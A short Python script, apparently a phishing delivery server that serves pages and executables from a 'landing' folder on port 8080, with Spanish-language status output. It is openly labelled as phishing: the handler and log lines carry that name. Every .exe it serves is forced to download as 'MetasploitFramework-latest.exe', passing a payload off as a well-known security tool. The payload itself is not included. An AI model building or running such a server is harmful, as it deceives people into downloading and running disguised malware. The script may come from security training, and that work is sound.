from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import os

HOST = '0.0.0.0'
PORT = 8080
BASE = os.path.dirname(os.path.abspath(__file__))
LANDING = os.path.join(BASE, 'landing')


class PhishingHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.split('?')[0].lstrip('/') or 'index.html'
        full = os.path.join(LANDING, path)

        if not os.path.abspath(full).startswith(os.path.abspath(LANDING)):
            self.send_error(403)
            return
        if not os.path.exists(full):
            self.send_error(404)
            return

        if full.endswith('.exe'):
            ctype = 'application/octet-stream'
        elif full.endswith('.html'):
            ctype = 'text/html; charset=utf-8'
        else:
            ctype = 'application/octet-stream'

        with open(full, 'rb') as f:
            data = f.read()

        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(data)))
        if full.endswith('.exe'):
            self.send_header('Content-Disposition',
                             'attachment; filename="MetasploitFramework-latest.exe"')
        self.end_headers()
        self.wfile.write(data)

    def log_message(self, format, *args):
        print(f"[PHISH] {self.client_address[0]} - {self.path}")


if __name__ == "__main__":
    os.makedirs(LANDING, exist_ok=True)
    print(f"[*] Servidor de phishing (multihilo) en http://{HOST}:{PORT}/")
    ThreadingHTTPServer((HOST, PORT), PhishingHandler).serve_forever()
